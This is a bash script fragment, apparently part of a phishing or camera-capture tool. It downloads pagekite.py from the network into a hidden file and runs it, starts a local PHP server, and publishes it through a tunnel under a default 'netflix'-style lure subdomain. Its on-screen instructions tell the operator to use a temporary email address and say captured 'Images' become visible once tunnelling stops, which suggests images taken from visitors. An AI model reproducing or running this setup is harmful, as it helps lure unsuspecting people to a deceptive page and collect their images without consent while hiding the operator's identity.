
if [[ -e .pagekite.sh ]]; then
echo ""
else
curl -o .pagekite.sh https://pagekite.net/pk/pagekite.py > /dev/null 2>&1
fi

pagekite_def_sub="netflix$RANDOM"
pagekite_def_port="5555"
pagekite_choose_subdef="Y"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $pagekite_def_port
read pagekite_port
pagekite_port="${pagekite_port:-${pagekite_def_port}}"
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Want Custom Subdomain? (Default:\e[0m\e[1;77m \e[1;31m[\e[1;33mY\e[1;31m/\e[1;33mn\e[1;31m]\e[1;32m : \e[0m\e[1;96m'
read pagekite_choose_sub
pagekite_choose_sub="${pagekite_choose_sub:-${pagekite_choose_subdef}}"
if [[ $pagekite_choose_sub == "Y" || $pagekite_choose_sub == "y" || $pagekite_choose_sub == "Yes" || $pagekite_choose_sub == "yes" ]]; then
pagekite_subdomain_resp=true
printf "\e[0m\n"
printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Input your Subdomain: (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $pagekite_def_sub
read pagekite_subdomain
pagekite_subdomain="${pagekite_subdomain:-${pagekite_def_sub}}"
fi
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$pagekite_port\e[0m\e[1;92m)\e[0m\n"
sleep 2
clear
banner
printf "\n\e[1;33m\t  Read This Very Carefully !\e[0m\n\n"
printf " \e[1;31m[\e[1;37m01\e[1;31m]\e[1;33m Use a Temporary Email Address.\e[1;31m(\e[1;36mtempail.com\e[1;31m)\e[0m\n\n"
printf " \e[1;31m[\e[1;37m02\e[1;31m]\e[1;33m Sometime it Requires Email verification.\e[0m\n\n"
printf " \e[1;31m[\e[1;37m03\e[1;31m]\e[1;33m Press CTRL + C To Stop Tunneling.\e[0m\n\n"
printf " \e[1;31m[\e[1;37m04\e[1;31m]\e[1;33m You can see the Images only After Stopping Tunneling.\e[0m\n\n"
printf "\e[0m\n"
printf "\e[1;33m      Press Enter to Start Tunnelling\e[0m\n"
read enter
sleep 1



fuser -k $pagekite_port/tcp > /dev/null 2>&1
php -S localhost:$pagekite_port > /dev/null 2>&1 &

if [[ $pagekite_subdomain_resp == true ]]; then
sleep 1
python2 .pagekite.sh --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
else
sleep 1
python2 .pagekite.sh --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
fi
